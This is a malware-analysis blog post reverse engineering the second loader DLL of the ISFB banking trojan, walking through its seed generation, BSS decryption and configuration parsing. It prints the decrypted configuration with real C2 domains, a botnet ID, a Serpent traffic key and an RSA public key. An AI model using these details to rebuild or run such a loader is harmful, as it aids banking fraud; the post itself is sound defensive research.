<li class="page_item page-item-2877"><a href="https://www.0ffset.net/corporate/">Corporate/Bulk Orders</a></li>
<li class="page_item page-item-2642"><a href="https://www.0ffset.net/courses/">Courses</a></li>
<li class="page_item page-item-1390"><a href="https://www.0ffset.net/faqs/">FAQs</a></li>
<li class="page_item page-item-2274"><a href="https://www.0ffset.net/">Home</a></li>
<li class="page_item page-item-2617"><a href="https://www.0ffset.net/my-account/">My account</a></li>
<li class="page_item page-item-7264"><a href="https://www.0ffset.net/order-cancelled/">Order Cancelled</a></li>
<li class="page_item page-item-5602"><a href="https://www.0ffset.net/privacy-policy/">Privacy Policy</a></li>
<li class="page_item page-item-2614"><a href="https://www.0ffset.net/shop/">Shop</a></li>
<li class="page_item page-item-5608"><a href="https://www.0ffset.net/terms-and-conditions/">Terms And Conditions</a></li>
<li class="page_item page-item-3038 page_item_has_children"><a href="https://www.0ffset.net/training/">Training</a>
<ul class='children'>
	<li class="page_item page-item-2451"><a href="https://www.0ffset.net/training/zero2auto/">Zero2Automated: Advanced Malware Analysis</a></li>
</ul>
</li>
</ul></div>
			</div>   	
	    </div>
    </div>
</div>    <!-- #header-mobile-close -->

</header>
<!-- #site-header-close -->
<!-- #side-panel-open -->
<!-- #side-panel-close -->
	<div id="content" class="site-content">
	        
            <div class="page-header flex-middle"  style="background-image: url(https://www.0ffset.net/wp-content/uploads/2022/09/emile-perron-xrVDYZRGdw4-unsplash.png);" >
                <div class="container">
                    <div class="inner ">
                                                    <h1 class="page-title">Blog Post</h1>
                        <ul id="breadcrumbs" class="breadcrumbs none-style"><li><a href="https://www.0ffset.net">Home</a></li><li><a href="https://www.0ffset.net/blog/">Blog</a></li><li><a href="https://www.0ffset.net/category/reverse-engineering/malware-analysis/">Malware Analysis</a></li><li class="active">Analyzing ISFB &#8211; The Second Loader</li></ul>    
                            </div>
                </div>
            </div>
        	<div class="entry-content">
		<div class="container">
			<div class="row">
				<div id="primary" class="content-area col-lg-9 col-md-9 col-sm-12 col-xs-12">
					<main id="main" class="site-main">
						
					
 

<article id="post-2117" class="blog-post post-box post-2117 post type-post status-publish format-standard has-post-thumbnail hentry category-malware-analysis category-reverse-engineering">
    
            <div class="entry-media">
                <div class="post-cat"><span class="posted-in"><a href="https://www.0ffset.net/category/reverse-engineering/malware-analysis/" rel="category tag">Malware Analysis</a> <a href="https://www.0ffset.net/category/reverse-engineering/" rel="category tag">Reverse Engineering</a></span></div>                <img fetchpriority="high" width="857" height="615" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1.png 857w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1-600x431.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1-300x215.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1-768x551.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1-720x517.png 720w" sizes="(max-width: 857px) 100vw, 857px" />            </div>
            
            <div class="inner-post">
        <header class="entry-header">

                        <div class="entry-meta">
                <span class="posted-on">_ <a href="https://www.0ffset.net/reverse-engineering/analyzing-isfb-second-loader/" rel="bookmark"><time class="entry-date published" datetime="2019-05-25T22:10:17+01:00">25th May 2019</time></a></span><span class="byline">_ <a class="url fn n" href="https://www.0ffset.net/author/dan489400/">0verfl0w_</a></span><span class="comment-num">_ <a href="https://www.0ffset.net/reverse-engineering/analyzing-isfb-second-loader/#comments">1 Comment</a></span>            </div><!-- .entry-meta -->
            
            <h3 class="entry-title">Analyzing ISFB &#8211; The Second Loader</h3>
        </header><!-- .entry-header -->

        <div class="entry-summary">

            
<p>So it&#8217;s been quite a while since my last post, however now that my<a aria-label=" Beginner Malware Analysis Course (opens in a new tab)" href="https://0verfl0w.podia.com/malware-analysis-course" target="_blank" rel="noreferrer noopener"> </a><strong><a aria-label=" Beginner Malware Analysis Course (opens in a new tab)" href="https://0verfl0w.podia.com/malware-analysis-course" target="_blank" rel="noreferrer noopener">Beginner Malware Analysis Course</a></strong> is complete, the posts should be more and more frequent, although that obviously depends on the complexity of the samples I am analyzing. If you haven&#8217;t checked out my last post on ISFB where we analyzed the first loader, check that out <strong><a aria-label="here (opens in a new tab)" rel="noreferrer noopener" href="https://www.0ffset.net/reverse-engineering/malware-analysis/analysing-isfb-loader/" target="_blank">here</a></strong> to get some context for this part. </p>



<p>The second loader is part of the infection chain for a group of threat actors utilizing ISFB for financial gain, which I gave the name &#8220;Group 53&#8221;. You can read more information about this particular group in the previous post as well, which contains a lot more detail about the group and the ISFB banking trojan itself. The second loader is in DLL format, with it being named &#8220;RPCRT4.dll&#8221; by the group, so we will be referring to the DLL with that name. This is quite an old sample, however as I was able to analyze it previously when the C2s were still alive, I was able to grab a PCAP file containing the communication to and from the sample, so we can still debug the sample and as the data is all valid, it should stay live. Anyway, if you want to follow along with the analysis or do some analysis on your own, all the samples have been uploaded to <strong><a aria-label=" (opens in a new tab)" rel="noreferrer noopener" href="https://beta.virusbay.io/" target="_blank">VirusBay</a></strong>. Let&#8217;s start reversing!</p>



<pre class="wp-block-code"><code>MD5 Of RPCRT4.dll: 52b4480de6f4d4f32fba2b535941c284</code></pre>



<p>Taking a look at the entry point, only one function is called when the sample first executes, this being <strong>First_Function </strong>(sub_1D4677), with a handle to the DLL instance being pushed as the argument (pointing to the base address of the DLL). This entry point is similar for pretty much all the samples of RPCRT4.dll that I have looked at, so if you are analyzing a sample of ISFB and find a similar function in a new region of memory, it could be the second loader DLL.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img decoding="async" width="864" height="891" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_1-2.png" alt="" class="wp-image-4694" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_1-2.png 864w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_1-2-600x619.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_1-2-291x300.png 291w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_1-2-768x792.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_1-2-720x743.png 720w" sizes="(max-width: 864px) 100vw, 864px" /></figure></div>



<p>Upon stepping into this function, you will probably recognize some similarities to the previous loader. Looking at the pseudocode below, we can see that first a heap is created, to be used later on, and then the program gets a handle on itself, which is used in the next function named <strong>Decrypt_BSS_Section</strong> (sub_1D55F0). As the name suggests, this function decrypts the data in the .BSS section. It contains the same decryption function as the first loader, however due to the fact that the .BSS section is at a different address (0xC000 rather than 0x6000), the resulting decryption key will be different. After decrypting the .BSS section using the decryption script which you can find <strong><a href="https://github.com/0ver-fl0w/ISFB_Tools/blob/master/BSS_Decrypt.py" target="_blank" rel="noreferrer noopener" aria-label="here (opens in a new tab)">here</a></strong>, we can finish looking at this function. The sample checks to see if the system is 32 or 64 bit, and then executes the final function, named <strong>Main_Func</strong> (sub_1D6C79), before exiting. So, we need to step into <strong>Main_Func</strong>.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img decoding="async" width="948" height="552" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_2-2.png" alt="" class="wp-image-4695" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_2-2.png 948w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_2-2-600x349.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_2-2-300x175.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_2-2-768x447.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_2-2-720x419.png 720w" sizes="(max-width: 948px) 100vw, 948px" /></figure></div>



<p>Looking at the function <strong>Main_Func</strong>, it is clear that there are a number of different things happening inside it, so this part will be split into a few different sections.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="877" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_3-2-1024x877.png" alt="" class="wp-image-4696" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_3-2-1024x877.png 1024w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_3-2-600x514.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_3-2-300x257.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_3-2-768x658.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_3-2-720x617.png 720w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_3-2.png 1039w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p><strong>Linear Congruential Random Number Generator (LCRNG)</strong> </p>



<p>Throughout the execution of this second loader, one particular algorithm known as a Linear Congruential Random Number Generator resurfaces time and time again, with it being identifiable through it&#8217;s constants. So, what is a <strong>LCRNG</strong>? Well according to <strong><a href="https://en.wikipedia.org/wiki/Linear_congruential_generator" target="_blank" rel="noreferrer noopener" aria-label="Wikipedia (opens in a new tab)">Wikipedia</a></strong>:</p>



<pre class="wp-block-code"><code>A linear congruential generator (LCG) is an algorithm that yields a sequence of pseudo-randomized numbers calculated with a discontinuous piecewise linear equation. The method represents one of the oldest and best-known pseudorandom number generator algorithms.&#91;1] The theory behind them is relatively easy to understand, and they are easily implemented and fast, especially on computer hardware which can provide modulo arithmetic by storage-bit truncation.</code></pre>



<p>Now, I&#8217;m not a mathematician, so I have no clue as to what half of these terms mean, so I will focus on how exactly I was able to locate and determine what this algorithm was.</p>



<p>Looking at the image below, we can see that first the loader calls a function named <strong>QueryTokenInformation</strong> (sub_1D57C7), which is responsible for getting a handle to the current process token using <strong>ZwOpenProcessToken()</strong> and then querying that token using <strong>ZwQueryInformationToken()</strong>, and then copying this to a newly allocated region of memory. The queried information copied over can be seen below, and is in fact the Security Identifier (SID) of the current user (taken from a debugger):</p>



<pre class="wp-block-code"><code>Current User SID {
     0x00000501, 0x05000000, 0x00000015, 0x6A80C140, 0x2065CB4C, 0xCA01B1D8, 0x000003E9, 
     0x00000000
};</code></pre>



<p>Once the querying function returns, a comparison is performed between 0x02 and the byte pointed to by <strong>ebp+var_1F</strong>, which can be displayed as <strong>ebp-1F</strong> or <strong>ebp-31</strong> (it is quite confusing, I agree). Following <strong>ebp-1F</strong> in a debugger points to the first DWORD in the retrieved SID, specifically the <strong>0x05</strong>. Obviously these two values don&#8217;t match, and so the value <strong>0x05</strong> is moved into <strong>eax</strong>, which is added to <strong>0xFFFFFFFE</strong>, resulting in <strong>eax</strong> containing <strong>0x03</strong>. This is then used in the loop just after, where the loader adds the fourth, fifth, and sixth DWORD in the SID together, which is then stored in the DWORD I have named <strong>Generated_Seed</strong>. Upon adding these values, we get <strong>0x154E83E64</strong>, which in DWORD format would be <strong>0x54E83E64</strong>.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="783" height="604" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_4-1.png" alt="" class="wp-image-4698" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_4-1.png 783w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_4-1-600x463.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_4-1-300x231.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_4-1-768x592.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_4-1-720x555.png 720w" sizes="(max-width: 783px) 100vw, 783px" /></figure></div>



<p>Then, the calculated value is XOR&#8217;d with the value <strong>0xCF8558FC</strong>, giving the final seed <strong>0x9B6D6698</strong>. The loader then initializes a critical section, moving the string <strong>0123456789ABCDEF</strong> into a newly allocated region of memory. This particular string resembles the default <strong>RC6 </strong>encryption/decryption key, which was used prior to Serpent being implemented.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="945" height="760" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_5-1.png" alt="" class="wp-image-4699" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_5-1.png 945w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_5-1-600x483.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_5-1-300x241.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_5-1-768x618.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_5-1-720x579.png 720w" sizes="(max-width: 945px) 100vw, 945px" /></figure></div>



<p>The next function called is named <strong>Get_Machine_User_Name_Gen_Value</strong> (sub_1D4BBE), and contains the first LCRNG function in the binary. In the psuedocode, we can see that the function <strong>Random_Value_Generator</strong> (sub_1D5D69) takes 2 arguments: the previously generated seed, and an empty region of memory. Based on the XOR operations below, we can assume that this empty region of memory will contain the randomly generated values. Before we check out the LCRNG function, let&#8217;s finish up analyzing this function. We can see that the loader calls <strong>GetUserNameW()</strong> and <strong>GetComputerNameW()</strong>, before performing a CRC32 calculation (same CRC32 function as the previous loader) on the Username and Computer Name. The results of the CRC32 hashing are XOR&#8217;d with the first (Alloc_Memory) and fourth (Alloc_Memory[3]) DWORD of the LCRNG value. Finally, the second DWORD of the randomly generated value is XOR&#8217;d with the result of XORing the values in <strong>eax</strong>, <strong>ecx</strong>, and <strong>edx </strong>after calling <strong>cpuid()</strong>. So, now we have an idea of this function, let&#8217;s examine the LCRNG.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="857" height="615" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1.png" alt="" class="wp-image-4700" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1.png 857w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1-600x431.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1-300x215.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1-768x551.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_6-1-720x517.png 720w" sizes="(max-width: 857px) 100vw, 857px" /></figure></div>



<p>The LCRNG function is quite small, and so doesn&#8217;t stand out as well as something like Serpent for example. Taking a look at the assembly or psuedocode of the function, we can get a good idea of what is going on. Specifically, two values stand out: <strong>0x19660D</strong> and <strong>0x3C6EF35F</strong>. After searching for either one of these two values we can find references to their usage in other variants of malware, specifically <strong>PowerSniff</strong>, <strong>PoSlurp</strong>, and <strong>ShellTea</strong>, two of which are <strong><a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://www.root9b.com/sites/default/files/whitepapers/PoS%20Malware%20ShellTea%20PoSlurp_1.pdf" target="_blank">PoS malware</a></strong>, and <strong><a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://unit42.paloaltonetworks.com/powersniff-malware-used-in-macro-based-attacks/" target="_blank">one being similar to ISFB itself</a></strong>. After some more searching, I came across <strong><a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://www.youtube.com/watch?v=Ll4yzgVvcfg" target="_blank">this video</a></strong> (1:06) from 2016, which explains how this particular algorithm works &#8211; except in the context of Super Mario 64 on the Nintendo DS. Whilst the other variants of malware utilize the algorithm to decrypt strings or encrypt stolen data, this loader simply uses it for generating a randomized value. Using all of the information we have found, we can replicate the algorithm using these values:</p>



<pre class="wp-block-code"><code>RNG Seed = 0x9B6D6698
RNG Adder = 0x3C6EF35F
RNG Multiply = 0x0019660D</code></pre>



<p>As we are able to debug the sample, we can take the quick route and simply put a breakpoint on the function return, and run until we hit it. From doing so three times, I was able to get 3 different values, however I did get a few repeats &#8211; this is due to the fact that there is a seed involved, so there is a high chance that there could be duplicates (*I think*). These are the three different, but similar, values that were generated:</p>



<pre class="wp-block-code"><code>1: 17 B9 B5 BC 8A 83 61 9D 4C 3B 5E 25 40 9F 72 29
2: 17 B9 B5 BC 8A 83 61 9D 4C 3B 5E 25 9F 72 29 74
3: 17 B9 B5 BC 8A 83 C0 90 1F F2 A9 F4 C3 46 ED 68</code></pre>



<p>In this example, we will be using one to calculate the end result of the function:  </p>



<pre class="wp-block-code"><code>17 B9 B5 BC 8A 83 61 9D 4C 3B 5E 25 40 9F 72 29</code></pre>



<p>As mentioned, it XORs the first DWORD (bytes swapped) with the CRC hash of the username, so for my virtual machine, the calculation was: <strong>0xBCB5B917 ^ 0x510E019D</strong>. This then overwrites the first DWORD, resulting in this:</p>



<pre class="wp-block-code"><code> 8A B8 BB ED 8A 83 61 9D 4C 3B 5E 25 40 9F 72 29</code></pre>



<p>Next, it XORs the last DWORD with the CRC hash of the system name, so the calculation was: <strong>0x29729F40 ^</strong> <strong>0xADAC6654</strong>. Once again, it overwrites the DWORD, resulting in:</p>



<pre class="wp-block-code"><code> 8A B8 BB ED 8A 83 61 9D 4C 3B 5E 25 14 F9 DE 84</code></pre>



<p>Finally, it XORs the second DWORD with the result of<strong> eax ^ ecx ^ edx</strong> after calling <strong>cpuid()</strong>, so the calculation was: <br><strong>0x9D61838A ^&nbsp;0xC9D3D67E</strong>, which again overwrites the DWORD, resulting in the final &#8220;string&#8221;:  </p>



<pre class="wp-block-code"><code>8A B8 BB ED F4 55 B2 54 4C 3B 5E 25 14 F9 DE 84</code></pre>



<p>This final value is stored in the variable <strong>Generated_Value</strong>, ready for use later on. So, that sums up the LCRNG function, let&#8217;s jump back to the calling function, and onto the next section.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="736" height="627" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_7.png" alt="" class="wp-image-4701" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_7.png 736w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_7-600x511.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_7-300x256.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_7-720x613.png 720w" sizes="(max-width: 736px) 100vw, 736px" /></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="697" height="376" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_8.png" alt="" class="wp-image-4703" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_8.png 697w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_8-600x324.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_8-300x162.png 300w" sizes="(max-width: 697px) 100vw, 697px" /></figure></div>



<p><strong>Parsing The Configuration</strong></p>



<p>The next function to analyze is named <strong>Parse_JJ_And_Config</strong> (sub_1D66E3), and as the name suggests, focuses on parsing the joined configuration (AKA Client_INI). I have gone over how the JJ structures are parsed in the prior post, and so in this post we will be looking at how the configuration itself is parsed. Looking at the pseudocode for this function, there are two important functions; <strong>Parse_JJ_Structure</strong> (sub_1D740D) and <strong>Parse_Config</strong> (sub_1D2DCD). You&#8217;ll also notice that <strong>Parse_JJ_Structure</strong> is called twice &#8211; this is due to the fact that the second loader contains two lots of joined data &#8211; a Public RSA Key, and the configuration, hence why you can see the variable <strong>RSA_Key</strong>. </p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="935" height="596" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_9.png" alt="" class="wp-image-4704" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_9.png 935w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_9-600x382.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_9-300x191.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_9-768x490.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_9-720x459.png 720w" sizes="(max-width: 935px) 100vw, 935px" /></figure></div>



<p>After decompressing both the RSA Key and configuration, we are left with these hex dumps below:</p>



<pre class="wp-block-code"><code>Decompressed RSA Pub. Key {
        0x00, 0x02, 0x00, 0x00, 0xE0, 0x64, 0x63, 0x8D, 0x56, 0xB4, 0x69, 0x04, 0x16, 0x10, 0x0B, 0xF5,
        0x05, 0x57, 0x54, 0x21, 0x64, 0xBA, 0x8E, 0x6E, 0xE2, 0x7A, 0xAD, 0x15, 0xF9, 0x7C, 0x1F, 0x79,
        0xA8, 0xC8, 0x39, 0x75, 0xE1, 0x29, 0x1C, 0x37, 0x15, 0xC5, 0x15, 0x69, 0xB0, 0x20, 0x4F, 0x2B,
        0x4D, 0x3C, 0xF8, 0x1F, 0x38, 0x06, 0x02, 0x8D, 0xD0, 0x1D, 0x15, 0x7C, 0x87, 0xF7, 0xF9, 0x1D,
        0xDB, 0x6D, 0xB1, 0xE5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x01, 0x00, 0x01
};</code></pre>



<pre class="wp-block-code"><code>Decompressed Configuration {
        0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0xEB, 0x5B, 0x65, 0x01, 0x00, 0x00, 0x00,
        0x20, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xF6, 0x5B, 0x66, 0xD0, 0x01, 0x00, 0x00, 0x00, 0x09, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8A, 0x79, 0x6B, 0x65, 0x01, 0x00, 0x00, 0x00,
        0x20, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x8F, 0xED, 0x6A, 0x55, 0x01, 0x00, 0x00, 0x00, 0x0D, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3E, 0x69, 0xA8, 0x4F, 0x01, 0x00, 0x00, 0x00,
        0xF8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x7F, 0x1C, 0x27, 0x11, 0x01, 0x00, 0x00, 0x00, 0xF1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x83, 0x57, 0x29, 0x48, 0x01, 0x00, 0x00, 0x00,
        0xDC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x25, 0x59, 0x4E, 0x58, 0x01, 0x00, 0x00, 0x00, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x45, 0x73, 0x17, 0x73, 0x01, 0x00, 0x00, 0x00,
        0xB1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x68, 0x0E, 0x85, 0xCD, 0x01, 0x00, 0x00, 0x00, 0xB7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0xFA, 0x1E, 0xC6, 0x01, 0x00, 0x00, 0x00,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x88, 0x74, 0x2E, 0xDF, 0x01, 0x00, 0x00, 0x00, 0x9D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x71, 0x66, 0x65, 0x6C, 0x69, 0x63, 0x69,
        0x61, 0x6C, 0x65, 0x77, 0x2E, 0x63, 0x69, 0x74, 0x79, 0x20, 0x6D, 0x7A, 0x67, 0x34, 0x39, 0x35,
        0x38, 0x6C, 0x63, 0x2E, 0x63, 0x6F, 0x6D, 0x20, 0x67, 0x78, 0x75, 0x78, 0x77, 0x6E, 0x73, 0x7A,
        0x61, 0x75, 0x2E, 0x62, 0x61, 0x6E, 0x64, 0x00, 0x33, 0x31, 0x38, 0x34, 0x00, 0x31, 0x32, 0x00,
        0x31, 0x30, 0x32, 0x39, 0x31, 0x30, 0x32, 0x39, 0x4A, 0x53, 0x4A, 0x55, 0x59, 0x4E, 0x48, 0x47,
        0x00, 0x31, 0x30, 0x00, 0x32, 0x30, 0x00, 0x30, 0x00, 0x63, 0x6F, 0x6E, 0x73, 0x74, 0x69, 0x74,
        0x75, 0x74, 0x69, 0x6F, 0x6E, 0x2E, 0x6F, 0x72, 0x67, 0x2F, 0x75, 0x73, 0x64, 0x65, 0x63, 0x6C,
        0x61, 0x72, 0x2E, 0x74, 0x78, 0x74, 0x00, 0x30, 0x78, 0x34, 0x65, 0x62, 0x37, 0x64, 0x32, 0x63,
        0x61, 0x00, 0x63, 0x6F, 0x6D, 0x20, 0x72, 0x75, 0x20, 0x6F, 0x72, 0x67, 0x00, 0x31, 0x30, 0x00,
        0x00
};</code></pre>



<p>If you&#8217;re looking for a quick way to extract the config, or scripts that can be used to automate the extraction of IOCs or decryption of data with regards to ISFB, you can check out my basic toolkit for doing so <strong><a rel="noreferrer noopener" aria-label="here (opens in a new tab)" href="https://github.com/0ver-fl0w/ISFB_Tools" target="_blank">here</a></strong>.<br>Now we have both the RSA key and Config, let&#8217;s examine how the configuration is parsed.</p>



<p>Looking at <strong>Parse_Config</strong>, it takes one argument, which is the result of XORing the &#8220;pnls&#8221; key that was mentioned in the previous post, with a certain embedded value. From closer research into ISFB and looking at the open source version, it is clear that the &#8220;pnls&#8221; key is in fact referred to as a <strong>CS_COOKIE</strong>, and so that is the term I will be using. In one instance, we can see the CS_COOKIE being XOR&#8217;d with the embedded value <strong>0x160717FA</strong>, which results in the value <strong>0x656B798A</strong>. If you look hard at the decompressed configuration above, you will probably locate the same hex value, although backwards: <strong>0x8A796B65</strong>. This is due to the fact that the configuration acts as a lookup table, pointing to the real configuration data such as the URLs or Botnet ID &#8211; this means the loader doesn&#8217;t have to search the entire config to locate a certain value, and instead it can get the offset for that value. Luckily, we are able to determine what value corresponds to what, thanks to the <strong><a href="https://lokalhost.pl/talks/botconf2016/" target="_blank" rel="noreferrer noopener" aria-label="work  (opens in a new tab)">work </a></strong>previously done by <strong><a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://twitter.com/maciekkotowicz" target="_blank">@Maciekkotowicz</a></strong>:</p>



<pre class="wp-block-code"><code>crc_table = {
        "0x556aed8f": "server",
        "0xea9ea760": "bootstrap",
        "0xacf9fc81": "screenshot",
        "0x602c2c26": "keyloglist",
        "0x656b798a": "botnet",
        "0xacc79a02": "knockertimeout",
        "0x955879a6": "sendtimeout",
        "0x31277bd5": "tasktimeout",
        "0x18a632bb": "configfailtimeout",
        "0xd7a003c9": "configtimeout",
        "0x4fa8693e": "key",
        "0xd0665bf6": "domains",
        "0x75e6145c": "domain",
        "0x6de85128": "bctimeout",
        "0xefc574ae": "dga_seed",
        "0xcd850e68": "dga_crc",
        "0x73177345": "dga_base_url",
        "0x11271c7f": "timer",
        "0x584e5925": "timer",
        "0x48295783": "timer",
        "0xdf351e24": "tor32_dll",
        "0x4b214f54": "tor64_dll",
        "0x510f22d2": "tor_domains",
        "0xdf2e7488": "dga_season",
        "0xc61efa7a": "dga_tld",
        "0xec99df2e": "ip_service"
}</code></pre>



<p>Using this lookup table, we can see that the loader parses several values; Timer1, Timer2. Timer3, BotnetID, Server, Key, and Domains. The timers are not extremely important, however the other values are. The Botnet ID is a number corresponding to the ID assigned to the botnet that the loader is a part of &#8211; some groups tend to use the same IDs, such as the group utilizing Hancitor using the same value <strong>2000</strong> &#8211; although this group typically alter the values, but still remain in the <strong>3xxx</strong> region. This loader contains the botnet ID <strong>3184</strong>. The Server seems to be used only in the data posted to the C2 server, and it simply is a server identifier, which is usually set to <strong>12</strong>. The key is the Serpent encryption key to use for encrypting all traffic to the server, and in this case it is <strong>10291029JSJUYNHG</strong>. Finally, the Domains are a list of C2 servers that the loader can reach out to in order to get the next stage. In this loader, the C2 servers are; <strong>qfelicialew.city</strong>, <strong>mzg4958lc.com</strong>, and <strong>gxuxwnszau.band</strong>. Whilst we do know what each value represents, let&#8217;s take a look at how the loader parses the config, so that we can automate it.</p>



